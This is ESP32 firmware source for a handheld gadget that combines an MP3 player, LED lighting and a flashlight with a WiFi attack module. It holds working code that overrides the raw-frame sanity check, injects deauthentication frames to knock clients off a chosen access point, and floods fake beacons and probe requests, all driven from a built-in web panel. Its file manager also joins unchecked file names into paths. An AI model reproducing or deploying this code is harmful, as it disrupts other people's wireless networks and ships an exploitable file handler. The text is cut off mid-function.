// ============================================================
//  SOUMYA Gadget v9.0 — Complete Final Firmware
//  ESP32-WROOM-32 | Core 2.0.17 | Deauth Enabled
//  MP3 Player + LED + Flashlight + WiFi Attacks + Web UI
// ============================================================

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <SD.h>
#include <WiFi.h>
#include <WebServer.h>
#include <Preferences.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Adafruit_NeoPixel.h>
#include <AudioFileSourceSD.h>
#include <AudioGeneratorMP3.h>
#include <AudioOutput.h>
#include "esp32-hal-bt.h"

extern "C" {
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "esp_avrc_api.h"
#include "esp_wifi.h"
}

#include "led_music_ui.h"
#include "file_ui.h"
#include "attacks_ui.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t,int32_t,int32_t){ return 0; }

// ═══ PINS ═══
#define OLED_SDA 21
#define OLED_SCL 22
#define OLED_ADDR 0x3C
#define SCR_W 128
#define SCR_H 64

#define PIN_SD_CS   5
#define PIN_SD_SCK  18
#define PIN_SD_MISO 19
#define PIN_SD_MOSI 23

#define PIN_LED_DATA 13
#define LED_MAX 144
#define PIN_STATUS_LED 12
#define STATUS_LED_COUNT 2

#define BTN_UP   14
#define BTN_DOWN 27
#define BTN_SEL  32
#define BTN_BACK 33

#define PIN_IR_RECV 4
#define PIN_IR_SEND 5

#define DEBOUNCE_MS 80
#define LONGPRESS_MS 1500

#define AP_SSID "ESP32-Gadget"
#define AP_PASS "88888888"
#define AP_CHANNEL 6
#define BT_NAME "SOUMYA-Music"
#define MUSIC_DIR "/music"
#define RING_SIZE 32768

// ═══ ENUMS ═══
enum Mode : uint8_t {
    M_BOOT, M_MAIN, M_SONGS, M_PLAYER, M_SYNC,
    M_BT_MENU, M_BT_SCAN, M_BT_DEV, M_BT_CONNECTING,
    M_LED_MENU, M_LED_FX, M_LED_MUSIC, M_LED_BRIGHT, M_LED_WIFI,
    M_FLASH_MENU, M_SETTINGS, M_SETTINGS_INFO,
    M_WIFI_FILES,
    M_HIDDEN, M_WIFI_TOOLS, M_BT_TOOLS, M_IR_MENU,
    M_ATTACK_RUN
};

enum AttackMode : uint8_t { ATK_NONE, ATK_BEACON, ATK_DEAUTH, ATK_PROBE };

struct APRecord { char ssid[33]; char bssid[18]; int rssi; int channel; };

// ═══ STATE ═══
struct State {
    Mode mode = M_BOOT;
    int mainSel = 0, subSel = 0;
    int volume = 100, ledBright = 150, ledCount = 60, curEffect = 1;
    int flashBright = 200, flashColor = 0, flashEffect = 0;
    bool flashOn = false;
    int batteryPct = 78;
    int songCount = 0, currentSong = -1;
    bool isPlaying = false;
    bool btConnected = false;
    bool displaySleepEnabled = true;
} g;

// ═══ GLOBALS ═══
Adafruit_SSD1306 display(SCR_W, SCR_H, &Wire, -1);
Adafruit_NeoPixel strip(LED_MAX, PIN_LED_DATA, NEO_GRB + NEO_KHZ800);
Adafruit_NeoPixel flashStrip(STATUS_LED_COUNT, PIN_STATUS_LED, NEO_GRB + NEO_KHZ800);
Preferences prefs;

WebServer ledServer(80);
WebServer fileServer(81);
WebServer attackServer(8080);
static bool webRunning = false;

// Song list
#define MAX_SONGS 64
String songFiles[MAX_SONGS];
int songCount = 0;

// BT
static bool a2dpStarted = false;
static bool a2dConn = false;

// Ring buffer
static int16_t ringBuf[RING_SIZE];
static volatile int rbHead = 0, rbTail = 0;
static portMUX_TYPE rbMux = portMUX_INITIALIZER_UNLOCKED;

// Attack
static volatile bool atkRun = false;
static AttackMode atkMode = ATK_NONE;
static TaskHandle_t atkTask = nullptr;
static char atkSSID[33], atkBSSID[18];
static int atkChannel = 1;
static volatile int atkPkts = 0;

// WiFi scan
static APRecord aps[30];
static int apCount = 0;

// Display sleep
static unsigned long lastActivity = 0;
static bool displayOff = false;

// Animation
static int animFrame = 0;

// ═══ RING BUFFER ═══
static inline int rb_avail() { return (rbHead - rbTail + RING_SIZE) % RING_SIZE; }
static void rb_push(int16_t L, int16_t R) {
    portENTER_CRITICAL(&rbMux);
    int next = (rbHead + 2) % RING_SIZE;
    if (next != rbTail) {
        ringBuf[rbHead] = L;
        ringBuf[(rbHead + 1) % RING_SIZE] = R;
        rbHead = next;
    }
    portEXIT_CRITICAL(&rbMux);
}
static bool rb_pop(int16_t &L, int16_t &R) {
    portENTER_CRITICAL(&rbMux);
    bool ok = (rbTail != rbHead);
    if (ok) {
        L = ringBuf[rbTail];
        rbTail = (rbTail + 1) % RING_SIZE;
        R = ringBuf[rbTail];
        rbTail = (rbTail + 1) % RING_SIZE;
    }
    portEXIT_CRITICAL(&rbMux);
    return ok;
}

class AudioOutRB : public AudioOutput {
public:
    bool ConsumeSample(int16_t s[2]) override { rb_push(s[0], s[1]); return true; }
    bool begin() override { return true; }
    bool stop() override { return true; }
};

// A2DP callback
static volatile uint32_t cbCalls = 0;
static int32_t a2d_data_cb(uint8_t* buf, int32_t len) {
    cbCalls++;
    int16_t* out = (int16_t*)buf;
    int frames = len / 4;
    for (int i = 0; i < frames; i++) {
        int16_t L = 0, R = 0;
        rb_pop(L, R);
        out[i*2] = L;
        out[i*2 + 1] = R;
    }
    return len;
}

static AudioFileSource* audioSrc = nullptr;
static AudioGeneratorMP3* audioMP3 = nullptr;
static AudioOutRB* audioRB = nullptr;

// ═══ BATTERY ═══
static int readBattery() {
    long s = 0;
    for (int i = 0; i < 10; i++) s += analogRead(34);
    float v = (s / 10.0f / 4095.0f) * 3.3f * 2.0f;
    if (v >= 4.15f) return 100;
    if (v <= 3.30f) return 0;
    return (int)((v - 3.30f) / (4.15f - 3.30f) * 100);
}

// ═══ DISPLAY HELPERS ═══
static void wakeDisplay() {
    lastActivity = millis();
    if (displayOff) {
        displayOff = false;
        display.ssd1306_command(SSD1306_DISPLAYON);
    }
}
static void checkSleep() {
    if (!g.displaySleepEnabled) return;
    if (!displayOff && (millis() - lastActivity > 30000)) {
        displayOff = true;
        display.clearDisplay(); display.display();
        display.ssd1306_command(SSD1306_DISPLAYOFF);
    }
}
static void drawBatteryDark(int x, int y) {
    display.drawRect(x, y, 16, 9, BLACK);
    display.fillRect(x + 16, y + 3, 2, 3, BLACK);
    int f = (g.batteryPct * 12) / 100;
    if (f > 0) display.fillRect(x + 2, y + 2, f, 5, BLACK);
}
static void drawBatteryLight(int x, int y) {
    display.drawRect(x, y, 16, 9, WHITE);
    display.fillRect(x + 16, y + 3, 2, 3, WHITE);
    int f = (g.batteryPct * 12) / 100;
    if (f > 0) display.fillRect(x + 2, y + 2, f, 5, WHITE);
}
static void hdr(const char* t) {
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK); display.setTextSize(1);
    display.setCursor(4, 3); display.print(t);
    drawBatteryDark(SCR_W - 22, 2);
    display.setTextColor(WHITE);
}
static void hdrL(const char* t) {
    display.drawFastHLine(0, 0, SCR_W, WHITE);
    display.setTextColor(WHITE); display.setTextSize(1);
    display.setCursor(4, 5); display.print(t);
    drawBatteryLight(SCR_W - 22, 4);
}

// ═══ ICONS ═══
static void iPlay(int x,int y,uint16_t c){display.fillTriangle(x+2,y+1,x+2,y+7,x+7,y+4,c);}
static void iMusic(int x,int y,uint16_t c){
    display.fillCircle(x+2,y+5,2,c);
    display.drawFastVLine(x+3,y+1,5,c);
    display.drawPixel(x+4,y+1,c); display.drawPixel(x+5,y+1,c);
    display.drawPixel(x+6,y+2,c); display.drawPixel(x+6,y+3,c);
    display.drawPixel(x+5,y+3,c);
}
static void iBT(int x,int y,uint16_t c){
    display.drawFastVLine(x+4,y,8,c);
    display.drawLine(x+4,y,x+6,y+2,c);
    display.drawLine(x+6,y+2,x+2,y+4,c);
    display.drawLine(x+4,y+7,x+6,y+5,c);
    display.drawLine(x+6,y+5,x+2,y+3,c);
}
static void iGame(int x,int y,uint16_t c){
    display.drawRect(x,y+1,8,6,c);
    display.drawPixel(x+2,y+3,c); display.drawPixel(x+1,y+4,c);
    display.drawPixel(x+2,y+4,c); display.drawPixel(x+3,y+4,c);
    display.drawPixel(x+2,y+5,c); display.drawPixel(x+5,y+3,c);
    display.drawPixel(x+5,y+5,c);
}
static void iLED(int x,int y,uint16_t c){
    display.drawCircle(x+4,y+3,3,c);
    display.fillRect(x+3,y+6,3,2,c);
    display.drawPixel(x+4,y+3,c);
}
static void iFlash(int x,int y,uint16_t c){
    display.fillRect(x+2,y,4,3,c);
    display.fillRect(x+3,y+3,2,5,c);
    display.drawPixel(x,y,c); display.drawPixel(x+7,y,c);
}
static void iWifi(int x,int y,uint16_t c){
    display.drawPixel(x+2,y,c); display.drawPixel(x+3,y,c);
    display.drawPixel(x+4,y,c); display.drawPixel(x+5,y,c);
    display.drawPixel(x+1,y+1,c); display.drawPixel(x+6,y+1,c);
    display.drawPixel(x,y+2,c); display.drawPixel(x+7,y+2,c);
    display.drawPixel(x+2,y+3,c); display.drawPixel(x+3,y+3,c);
    display.drawPixel(x+4,y+3,c); display.drawPixel(x+5,y+3,c);
    display.drawPixel(x+1,y+4,c); display.drawPixel(x+6,y+4,c);
    display.drawPixel(x+3,y+5,c); display.drawPixel(x+4,y+5,c);
    display.fillRect(x+3,y+6,2,2,c);
}
static void iEarbud(int x,int y,uint16_t c){
    display.fillCircle(x+2,y+3,2,c);
    display.fillRect(x+3,y+4,1,3,c);
    display.fillCircle(x+6,y+3,2,c);
    display.fillRect(x+6,y+4,1,3,c);
}

// ═══ MENU ROW HELPER ═══
static void drawRow(const char* txt, int y, bool s, int iconType) {
    if (s) {
        display.fillRoundRect(0, y, SCR_W, 10, 3, WHITE);
        display.setTextColor(BLACK);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, BLACK);
    } else {
        display.setTextColor(WHITE);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, WHITE);
    }
    uint16_t c = s ? BLACK : WHITE;
    switch (iconType) {
        case 0: iPlay(9,y+1,c); break;
        case 1: iMusic(9,y+1,c); break;
        case 2: iBT(9,y+1,c); break;
        case 3: iGame(9,y+1,c); break;
        case 4: iLED(9,y+1,c); break;
        case 5: iFlash(9,y+1,c); break;
        case 6: iWifi(9,y+1,c); break;
    }
    display.setCursor(21, y+2);
    display.print(txt);
    display.setTextColor(WHITE);
}
static void drawMenuList(const char* items[], int count, int sel, int iconType) {
    int vis = 4;
    int off = (sel >= 3) ? (sel - 2) : 0;
    if (off + vis > count) off = count - vis;
    if (off < 0) off = 0;
    for (int i = 0; i < vis && (i+off) < count; i++) {
        int idx = i + off;
        drawRow(items[idx], 16 + i*11, idx == sel, iconType);
    }
    if (count > vis) {
        int posY = 16 + (sel * 36) / (count - 1);
        display.drawRect(SCR_W-2, 16, 2, 44, WHITE);
        display.fillRect(SCR_W-2, posY, 2, 8, WHITE);
    }
}

// ═══ AUDIO PLAYBACK ═══
void loadSongs() {
    songCount = 0;
    const char* mp = MUSIC_DIR;
    File dir = SD.open(mp, FILE_READ);
    if (!dir || !dir.isDirectory()) return;
    File f = dir.openNextFile();
    while (f && songCount < MAX_SONGS) {
        String n = String(f.name());
        if (!f.isDirectory()) {
            String l = n; l.toLowerCase();
            if (l.endsWith(".mp3"))
                songFiles[songCount++] = String(MUSIC_DIR) + "/" + n;
        }
        f = dir.openNextFile();
    }
    dir.close();
    g.songCount = songCount;
}

String songName(int idx) {
    if (idx < 0 || idx >= songCount) return "(none)";
    String p = songFiles[idx];
    int s = p.lastIndexOf('/');
    return s >= 0 ? p.substring(s+1) : p;
}

void ensureBT() {
    if (a2dpStarted) return;
    Serial.println("[*] BT init...");
    esp_bt_controller_mem_release(ESP_BT_MODE_BLE);
    if (!btStart()) { Serial.println("[!] btStart fail"); return; }
    delay(200);
    if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_UNINITIALIZED)
        esp_bluedroid_init();
    if (esp_bluedroid_get_status() != ESP_BLUEDROID_STATUS_ENABLED)
        esp_bluedroid_enable();
    esp_bt_dev_set_device_name(BT_NAME);
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
    esp_a2d_source_init();
    esp_a2d_source_register_data_callback(a2d_data_cb);
    delay(200);
    a2dpStarted = true;
    Serial.println("[+] BT ready");
}

void stopSong() {
    if (audioMP3 && audioMP3->isRunning()) audioMP3->stop();
    if (audioSrc) audioSrc->close();
    delete audioMP3; audioMP3 = nullptr;
    delete audioSrc; audioSrc = nullptr;
    g.isPlaying = false;
    rbHead = rbTail = 0;
}

void playSong(int idx) {
    if (idx < 0 || idx >= songCount) return;
    stopSong();
    delay(100);
    g.currentSong = idx;
    ensureBT();
    audioSrc = (AudioFileSource*)new AudioFileSourceSD(songFiles[idx].c_str());
    if (!audioSrc) return;
    audioMP3 = new AudioGeneratorMP3();
    if (!audioMP3) { delete audioSrc; audioSrc = nullptr; return; }
    if (audioMP3->begin(audioSrc, audioRB)) {
        g.isPlaying = true;
        Serial.printf("[+] Playing: %s\n", songName(idx).c_str());
    } else {
        stopSong();
    }
}
void nextSong() { if (songCount) playSong((g.currentSong + 1) % songCount); }
void prevSong() { if (songCount) playSong((g.currentSong - 1 + songCount) % songCount); }

// ═══ LED ═══
static int ledHue = 0;
static void updateLED() {
    static unsigned long last = 0;
    if (millis() - last < 20) return;
    last = millis();
    int n = g.ledCount;
    switch (g.curEffect) {
        case 0: for (int i = 0; i < n; i++) strip.setPixelColor(i, strip.ColorHSV(ledHue*257, 255, g.ledBright)); break;
        case 1: for (int i = 0; i < n; i++) strip.setPixelColor(i, strip.ColorHSV((ledHue + i*256/n) & 0xFF * 257, 255, g.ledBright)); ledHue = (ledHue + 2) & 0xFF; break;
        case 2: { float b = (sin(millis()/1000.0f)+1)/2; for (int i = 0; i < n; i++) strip.setPixelColor(i, strip.ColorHSV(ledHue*257, 255, b*g.ledBright)); break; }
        case 3: { strip.clear(); int p = (millis()/40)%n; for (int i = 0; i < 5; i++) strip.setPixelColor((p+i)%n, strip.ColorHSV(ledHue*257, 255, g.ledBright >> i)); break; }
    }
    strip.show();
}

// ═══ FLASHLIGHT ═══
static const uint8_t FC[7][3] = {{255,255,255},{255,0,0},{0,255,0},{0,0,255},{255,255,0},{0,255,255},{255,0,255}};
static void flashApply() {
    if (!g.flashOn) { flashStrip.clear(); flashStrip.show(); return; }
    const uint8_t* c = FC[g.flashColor];
    uint8_t br = (uint32_t)g.flashBright * 255 / 100;
    for (int i = 0; i < STATUS_LED_COUNT; i++)
        flashStrip.setPixelColor(i, (uint32_t)c[0]*br/255, (uint32_t)c[1]*br/255, (uint32_t)c[2]*br/255);
    flashStrip.setBrightness(g.flashBright * 255 / 100);
    flashStrip.show();
}
static void flashSet(bool on) { g.flashOn = on; flashApply(); }

// ═══ WIFI ATTACKS ═══
static uint8_t deauthFrame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x07,0x00};

static bool parseMac(const char* s, uint8_t* o) {
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) o[i] = (uint8_t)v[i];
    return true;
}

static int buildBeacon(uint8_t* b, int bLen, const char* ssid, int ch) {
    int sl = strlen(ssid);
    if (sl > 32 || bLen < (38 + sl)) return 0;
    memset(b, 0, bLen);
    int i = 0;
    b[i++]=0x80; b[i++]=0x00; b[i++]=0x00; b[i++]=0x00;
    memset(b+i, 0xFF, 6); i += 6;
    uint8_t mac[6];
    for (int k = 0; k < 6; k++) mac[k] = random(0, 256);
    mac[0] = (mac[0] | 0x02) & 0xFE;
    memcpy(b+i, mac, 6); i += 6;
    memcpy(b+i, mac, 6); i += 6;
    i += 2; memset(b+i, 0, 8); i += 8;
    b[i++]=0x64; b[i++]=0x00; b[i++]=0x31; b[i++]=0x04;
    b[i++]=0x00; b[i++]=(uint8_t)sl;
    memcpy(b+i, ssid, sl); i += sl;
    b[i++]=0x01; b[i++]=0x08;
    const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
    memcpy(b+i, r, 8); i += 8;
    b[i++]=0x03; b[i++]=0x01; b[i++]=(uint8_t)ch;
    return i;
}

static const char* FAKE[] = {
    "JioFiber_5G","Airtel_Xstream","TP-Link_2.4G","Netgear_Home",
    "Sharma_Home","Rahul_iPhone","Home_Sweet_Home","AndroidAP_1234",
    "iPhone_Hotspot","Redmi_Note12","Samsung_A54","Cafe_Coffee_Day",
    "Free_Public_WiFi","Guest_Network","Setup_Required"
};
#define FAKE_N (sizeof(FAKE)/sizeof(FAKE[0]))

static void attackWorker(void*) {
    uint8_t bssid[6];
    parseMac(atkBSSID, bssid);
    atkPkts = 0;
    if (atkMode == ATK_BEACON) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t f[256];
        while (atkRun) {
            for (int ch = 1; ch <= 13 && atkRun; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                const char* s = FAKE[random(0, FAKE_N)];
                int l = buildBeacon(f, sizeof(f), s, ch);
                if (l > 0 && esp_wifi_80211_tx(WIFI_IF_STA, f, l, false) == ESP_OK) atkPkts++;
                delay(3);
            }
        }
    } else if (atkMode == ATK_DEAUTH) {
        WiFi.mode(WIFI_STA); delay(100);
        esp_wifi_set_channel(atkChannel, WIFI_SECOND_CHAN_NONE);
        uint8_t f[26];
        while (atkRun) {
            memcpy(f, deauthFrame, 26);
            memcpy(f+10, bssid, 6); memcpy(f+16, bssid, 6);
            for (int i = 0; i < 50; i++) {
                f[22] = i & 0xFF; f[23] = (i>>8) & 0xFF;
                if (esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false) == ESP_OK) atkPkts++;
            }
            delay(60);
        }
    } else if (atkMode == ATK_PROBE) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t f[128];
        while (atkRun) {
            for (int ch = 1; ch <= 13 && atkRun; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                memset(f, 0, sizeof(f));
                int i = 0;
                f[i++]=0x40; f[i++]=0x00; f[i++]=0x00; f[i++]=0x00;
                memset(f+i, 0xFF, 6); i += 6;
                uint8_t m[6];
                for (int k = 0; k < 6; k++) m[k] = random(0, 256);
                m[0] = (m[0]|0x02)&0xFE;
                memcpy(f+i, m, 6); i += 6;
                memcpy(f+i, m, 6); i += 6;
                i += 2;
                const char* s = FAKE[random(0, FAKE_N)];
                int sl = strlen(s);
                f[i++]=0x00; f[i++]=(uint8_t)sl;
                memcpy(f+i, s, sl); i += sl;
                f[i++]=0x01; f[i++]=0x08;
                const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
                memcpy(f+i, r, 8); i += 8;
                if (esp_wifi_80211_tx(WIFI_IF_STA, f, i, false) == ESP_OK) atkPkts++;
                delay(2);
            }
        }
    }
    WiFi.mode(WIFI_OFF);
    atkRun = false;
    atkMode = ATK_NONE;
    vTaskDelete(nullptr);
}

static void startBeacon() { if (atkRun) return; atkMode = ATK_BEACON; atkRun = true; xTaskCreatePinnedToCore(attackWorker,"atk",4096,nullptr,1,&atkTask,0); }
static void startProbe()  { if (atkRun) return; atkMode = ATK_PROBE;  atkRun = true; xTaskCreatePinnedToCore(attackWorker,"atk",4096,nullptr,1,&atkTask,0); }
static void startDeauth(int idx) {
    if (atkRun || idx < 0 || idx >= apCount) return;
    strncpy(atkSSID, aps[idx].ssid, 32); atkSSID[32]=0;
    strncpy(atkBSSID, aps[idx].bssid, 17); atkBSSID[17]=0;
    atkChannel = aps[idx].channel;
    atkMode = ATK_DEAUTH; atkRun = true;
    xTaskCreatePinnedToCore(attackWorker,"atk",8192,nullptr,1,&atkTask,0);
}
static void stopAttack() { if (!atkRun) return; atkRun = false; delay(400); }

static void wifiScan() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks(false, true);
    apCount = min(n, 30);
    for (int i = 0; i < apCount; i++) {
        strncpy(aps[i].ssid, WiFi.SSID(i).c_str(), 32); aps[i].ssid[32]=0;
        strncpy(aps[i].bssid, WiFi.BSSIDstr(i).c_str(), 17); aps[i].bssid[17]=0;
        aps[i].rssi = WiFi.RSSI(i);
        aps[i].channel = WiFi.channel(i);
    }
    WiFi.scanDelete();
}

// ═══ WEB HANDLERS ═══
static void hLedRoot() { ledServer.send_P(200, "text/html", LED_MUSIC_HTML); }
static void hLedCmd() {
    if (ledServer.hasArg("effect")) g.curEffect = ledServer.arg("effect").toInt();
    if (ledServer.hasArg("brightness")) { g.ledBright = constrain(ledServer.arg("brightness").toInt(),0,255); strip.setBrightness(g.ledBright); }
    if (ledServer.hasArg("count")) g.ledCount = constrain(ledServer.arg("count").toInt(),1,LED_MAX);
    if (ledServer.hasArg("hue")) ledHue = ledServer.arg("hue").toInt() & 0xFF;
    ledServer.send(200, "text/plain", "OK");
}
static void hMusicCmd() {
    String a = ledServer.arg("action");
    if (a == "play") { int i = ledServer.arg("idx").toInt(); if (i >= 0 && i < songCount) playSong(i); }
    else if (a == "next") nextSong();
    else if (a == "prev") prevSong();
    else if (a == "stop") stopSong();
    ledServer.send(200, "text/plain", "OK");
}
static void hMusicList() {
    String j = F("{\"songs\":[");
    for (int i = 0; i < songCount; i++) {
        if (i > 0) j += ',';
        j += F("{\"idx\":"); j += i;
        j += F(",\"name\":\""); j += songName(i); j += '"'; j += '}';
    }
    j += F("],\"current\":"); j += g.currentSong;
    j += F(",\"playing\":"); j += (g.isPlaying ? "true" : "false");
    j += '}';
    ledServer.send(200, "application/json", j);
}
static void hFileRoot() { fileServer.send_P(200, "text/html", FILE_MANAGER_HTML); }
static void hFileList() {
    uint32_t total = SD.totalBytes() >> 20;
    uint32_t free_ = (SD.totalBytes() - SD.usedBytes()) >> 20;
    String j = F("{\"files\":[");
    File dir = SD.open(MUSIC_DIR, FILE_READ);
    bool first = true;
    if (dir) {
        File f = dir.openNextFile();
        while (f) {
            if (!f.isDirectory()) {
                if (!first) j += ',';
                j += F("{\"name\":\""); j += String(f.name());
                j += F("\",\"size\":"); j += (uint32_t)f.size(); j += '}';
                first = false;
            }
            f = dir.openNextFile();
        }
        dir.close();
    }
    j += F("],\"totalMB\":"); j += total;
    j += F(",\"freeMB\":"); j += free_;
    j += '}';
    fileServer.send(200, "application/json", j);
}
static void hFileDelete() {
    String n = fileServer.arg("name");
    String p = String(MUSIC_DIR) + "/" + n;
    SD.remove(p.c_str());
    loadSongs();
    fileServer.send(200, "text/plain", "OK");
}
static void hFileDl() {
    String n = fileServer.arg("name");
    String p = String(MUSIC_DIR) + "/" + n;
    File f = SD.open(p.c_str(), FILE_READ);
    if (!f) { fileServer.send(404, "text/plain", "Not found"); return; }
    fileServer.sendHeader("Content-Disposition", "attachment; filename=" + n);
    fileServer.streamFile(f, "audio/mpeg");
    f.close();
}
static File _upF;
static void hFileUp() {
    HTTPUpload& u = fileServer.upload();
    if (u.status == UPLOAD_FILE_START) {
        String p = String(MUSIC_DIR) + "/" + u.filename;
        _upF = SD.open(p.c_str(), FILE_WRITE);
    } else if (u.status == UPLOAD_FILE_WRITE) {
        if (_upF) _upF.write(u.buf, u.currentSize);
    } else if (u.status == UPLOAD_FILE_END) {
        if (_upF) _upF.close();
        loadSongs();
        fileServer.send(200, "text/plain", "OK");
    }
}
static void hAtkRoot() { attackServer.send_P(200, "text/html", ATTACKS_HTML); }
static void hAtkScan() {
    wifiScan();
    String j = F("{\"aps\":[");
    for (int i = 0; i < apCount; i++) {
        if (i > 0) j += ',';
        j += F("{\"idx\":"); j += i;
        j += F(",\"ssid\":\""); j += aps[i].ssid; j += '"';
        j += F(",\"bssid\":\""); j += aps[i].bssid; j += '"';
        j += F(",\"rssi\":"); j += aps[i].rssi;
        j += F(",\"ch\":"); j += aps[i].channel; j += '}';
    }
    j += F("],\"count\":"); j += apCount; j += '}';
    attackServer.send(200, "application/json", j);
}
static void hAtkCmd() {
    String c = attackServer.arg("cmd");
    if (c == "beacon") startBeacon();
    else if (c == "probe") startProbe();
    else if (c == "stop") stopAttack();
    else if (c == "deauth") { int i = attackServer.arg("idx").toInt(); startDeauth(i); }
    attackServer.send(200, "text/plain", "OK");
}
static void hAtkStatus() {
    String j = F("{\"running\":");
    j += (atkRun ? "true" : "false");
    j += F(",\"packets\":"); j += atkPkts;
    j += F(",\"creds\":[]}");
    attackServer.send(200, "application/json", j);
}
static void hEmergency() {
    stopAttack();
    stopSong();
    ledServer.stop(); fileServer.stop(); attackServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    webRunning = false;
    g.mode = M_MAIN; g.mainSel = 0;
    attackServer.send(200, "text/plain", "OK");
}

static void startWeb() {
    if (webRunning) return;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL);
    delay(300);
    ledServer.on("/", hLedRoot);
    ledServer.on("/led", hLedCmd);
    ledServer.on("/music", hMusicCmd);
    ledServer.on("/music/list", hMusicList);
    ledServer.begin();
    fileServer.on("/", hFileRoot);
    fileServer.on("/list", hFileList);
    fileServer.on("/delete", HTTP_POST, hFileDelete);
    fileServer.on("/download", hFileDl);
    fileServer.on("/upload", HTTP_POST, [](){ fileServer.send(200,"text/plain","OK"); }, hFileUp);
    fileServer.begin();
    attackServer.on("/", hAtkRoot);
    attackServer.on("/scan", hAtkScan);
    attackServer.on("/cmd", hAtkCmd);
    attackServer.on("/status", hAtkStatus);
    attackServer.on("/emergency", HTTP_POST, hEmergency);
    attackServer.begin();
    webRunning = true;
    Serial.println("[WEB] AP active on 192.168.4.1");
}
static void stopWeb() {
    if (!webRunning) return;
    ledServer.stop(); fileServer.stop(); attackServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    webRunning = false;
}

// ═══ SCREEN FUNCTIONS ═══
static void sBoot() {
    static int step = 0;
    static unsigned long lastMs = 0;
    static int w = 0;
    const char* n = "SOUMYA";
    unsigned long now = millis();
    if (step == 0) { display.clearDisplay(); display.display(); lastMs = now; step = 1; return; }
    if (step >= 1 && step <= 6) {
        if (now - lastMs > 180) {
            display.clearDisplay();
            display.setTextSize(2); display.setTextColor(WHITE);
            for (int i = 0; i < step; i++) { display.setCursor(22+i*15, 20); display.print(n[i]); }
            if (step < 6) display.fillRect(22 + step*15, 20, 2, 16, WHITE);
            display.display();
            lastMs = now; step++;
        }
    } else if (step == 7) {
        if (now - lastMs > 400) {
            display.fillRect(22 + 6*15, 20, 2, 16, BLACK);
            display.display();
            lastMs = now; step++;
        }
    } else if (step >= 8 && step <= 36) {
        if (now - lastMs > 30) {
            display.clearDisplay();
            display.setTextSize(2); display.setTextColor(WHITE);
            for (int i = 0; i < 6; i++) { display.setCursor(22+i*15, 20); display.print(n[i]); }
            display.drawFastHLine(22, 42, w, WHITE);
            display.display();
            w += 3; lastMs = now; step++;
        }
    } else if (step == 37) {
        if (now - lastMs > 400) { g.mode = M_MAIN; g.mainSel = 0; step = 0; w = 0; }
    }
}

static const char* MAIN[] = {"Play","Songs","Bluetooth","Games","LED Effects","Flashlight"};
static void sMain() {
    display.clearDisplay(); hdr("MP3 PLAYER");
    drawMenuList(MAIN, 6, g.mainSel, -1);
    int off = (g.mainSel >= 3) ? (g.mainSel - 2) : 0;
    if (off + 4 > 6) off = 2;
    for (int i = 0; i < 4; i++) {
        int idx = i + off, y = 16 + i*11;
        bool s = (idx == g.mainSel);
        uint16_t c = s ? BLACK : WHITE;
        display.fillRect(8, y+1, 10, 8, s ? WHITE : BLACK);
        switch (idx) {
            case 0: iPlay(9, y+1, c); break;
            case 1: iMusic(9, y+1, c); break;
            case 2: iBT(9, y+1, c); break;
            case 3: iGame(9, y+1, c); break;
            case 4: iLED(9, y+1, c); break;
            case 5: iFlash(9, y+1, c); break;
        }
    }
    display.display();
}

static void sSongs() {
    display.clearDisplay(); hdr("SONGS");
    bool wf = (g.subSel == 0);
    if (wf) { display.fillRoundRect(1,15,SCR_W-2,11,2,WHITE); display.setTextColor(BLACK); }
    else { display.drawRoundRect(1,15,SCR_W-2,11,2,WHITE); display.setTextColor(WHITE); }
    uint16_t cW = wf ? BLACK : WHITE;
    iWifi(4,16,cW);
    display.setCursor(15,17); display.print("WiFi Files");
    display.setCursor(SCR_W-34,17); display.print("UPLOAD");
    display.setTextColor(WHITE);
    display.drawFastHLine(0,27,SCR_W,WHITE);
    int vis = 3;
    int off = (g.subSel >= 3) ? (g.subSel - 2) : 0;
    if (off + vis > songCount) off = songCount - vis;
    if (off < 0) off = 0;
    for (int i = 0; i < vis && (i+off) < songCount; i++) {
        int idx = i + off + 1, y = 29 + i*11;
        bool s = (idx == g.subSel);
        if (s) { display.fillRect(0,y,SCR_W,10,WHITE); display.setTextColor(BLACK); }
        else display.setTextColor(WHITE);
        iMusic(2,y+1,s?BLACK:WHITE);
        char b[20]; snprintf(b,sizeof(b),"%.18s",songName(idx-1).c_str());
        display.setCursor(12,y+1); display.print(b);
        display.setTextColor(WHITE);
    }
    display.display();
}

static void sPlayer() {
    display.clearDisplay(); hdrL("NOW PLAYING");
    display.setTextColor(WHITE); display.setTextSize(2);
    String n = songName(g.currentSong);
    char t[16]; strncpy(t, n.c_str(), 14); t[14]=0;
    int tw = strlen(t)*12; int tx = (SCR_W-tw)/2; if (tx < 0) tx = 0;
    display.setCursor(tx, 22); display.print(t);
    int bx=10, by=48, bw=SCR_W-20;
